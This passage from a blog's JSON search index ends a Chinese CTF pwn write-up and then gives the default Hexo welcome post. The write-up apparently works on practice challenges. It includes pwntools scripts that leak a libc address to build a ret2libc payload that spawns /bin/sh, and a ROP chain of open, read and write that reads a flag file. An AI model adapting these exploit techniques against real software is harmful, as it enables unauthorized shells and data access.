str(elf.got['puts']))29 leak = hex(int(p.recvline()[-9:-1], 16))30 log.info(\"leak -&gt; \" + leak)3132 libc_base = int(leak, 16) - libc.symbols['puts']33 log.info(\"libc_base -&gt; \" + hex(libc_base))3435 system = libc_base + libc.symbols['system']36 binsh = libc_base + libc.search('/bin/sh\\0').next()3738 pppr = 0x080486CD39 payload = 'a'*(0x38 + 4) + p32(system) + p32(0x12345678) + p32(binsh)4041 p.sendlineafter(\"Leave some message for me :\", payload)4243 p.interactive()4445 if __name__ == '__main__':46 pwn() 成功getshell simplerop除了NX其它全关 观察程序逻辑只有一个栈溢出， 而这个文件是个静态链接的文件，尝试找system的地址， 但是查找符号表没找到system但是open, write, read的地址都可以找到， 这意味着跟前面的题目思路一样， 利用rop调用这三个函数来读取flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546471 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./simplerop\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./simplerop\")2627 pppr = 0x080491D22829 payload = 'a'*(0x1c + 4) + p32(elf.symbols['read']) + p32(pppr)30 payload += p32(0) + p32(elf.bss() + 0x200) + p32(0x10) + p32(elf.symbols['main'])3132 p.sendafter(\"Your input :\", payload.ljust(100, '\\x00'))3334 p.sendline(\"flag\\0\")3536 raw_input()37 payload = 'a'*0x1838 payload += p32(elf.symbols['open']) + p32(pppr) + p32(elf.bss() + 0x200) + p32(4) + p32(0)39 payload += p32(elf.symbols['read']) + p32(pppr) + p32(3) + p32(elf.bss() + 0x200) + p32(0x10)40 payload += p32(elf.symbols['write']) + p32(pppr) + p32(1) + p32(elf.bss() + 0x200) + p32(0x10)4142 p.sendlineafter(\"Your input :\", payload)4344 p.interactive()4546 if __name__ == '__main__':47 pwn() 结果:","tags":[{"name":"PWN","slug":"PWN","permalink":"http://wafuter.jxustctf.top/tags/PWN/"}]},{"title":"Hello World","date":"2019-12-19T13:45:35.530Z","path":"2019/12/19/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[]}]